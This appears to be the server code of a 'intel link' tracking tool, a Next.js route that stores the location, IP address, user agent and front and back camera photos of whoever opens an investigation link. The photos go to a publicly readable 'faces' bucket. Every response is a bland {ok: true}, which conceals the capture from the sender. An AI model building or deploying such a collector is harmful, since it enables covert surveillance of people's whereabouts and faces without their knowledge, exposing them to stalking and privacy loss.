import { createClient } from "@supabase/supabase-js";
import { NextRequest, NextResponse } from "next/server";

export const dynamic = "force-dynamic";

function getAdminClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
    { auth: { autoRefreshToken: false, persistSession: false } }
  );
}

async function uploadPhoto(
  supabase: ReturnType<typeof getAdminClient>,
  captureId: string,
  side: "front" | "back",
  dataUrl: string
): Promise<string | null> {
  try {
    const base64 = dataUrl.split(",")[1];
    if (!base64) return null;
    const buffer = Buffer.from(base64, "base64");
    const path = `intel-link/${captureId}/${side}.jpg`;

    const { error } = await supabase.storage.from("faces").upload(path, buffer, {
      contentType: "image/jpeg",
      upsert: true,
    });

    if (error) return null;
    return supabase.storage.from("faces").getPublicUrl(path).data.publicUrl;
  } catch {
    return null;
  }
}

export async function POST(req: NextRequest) {
  const body = await req.json();
  const { slug, latitude, longitude, accuracy, photoFront, photoBack, userAgent } = body;

  if (!slug) return NextResponse.json({ ok: true });

  const supabase = getAdminClient();
  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "unknown";

  const { data: investigation } = await supabase
    .from("ops_intel_link_investigations")
    .select("id, status")
    .eq("slug", slug)
    .single();

  if (!investigation || investigation.status !== "ativa") return NextResponse.json({ ok: true });

  const { data: capture } = await supabase
    .from("ops_intel_link_captures")
    .insert({
      investigation_id: investigation.id,
      latitude: latitude ?? null,
      longitude: longitude ?? null,
      accuracy: accuracy ?? null,
      user_agent: userAgent || req.headers.get("user-agent") || null,
      ip,
    })
    .select()
    .single();

  if (!capture) return NextResponse.json({ ok: true });

  const [frenteUrl, traseiraUrl] = await Promise.all([
    photoFront ? uploadPhoto(supabase, capture.id, "front", photoFront) : Promise.resolve(null),
    photoBack ? uploadPhoto(supabase, capture.id, "back", photoBack) : Promise.resolve(null),
  ]);

  if (frenteUrl || traseiraUrl) {
    await supabase
      .from("ops_intel_link_captures")
      .update({ foto_frente_url: frenteUrl, foto_traseira_url: traseiraUrl })
      .eq("id", capture.id);
  }

  return NextResponse.json({ ok: true });
}
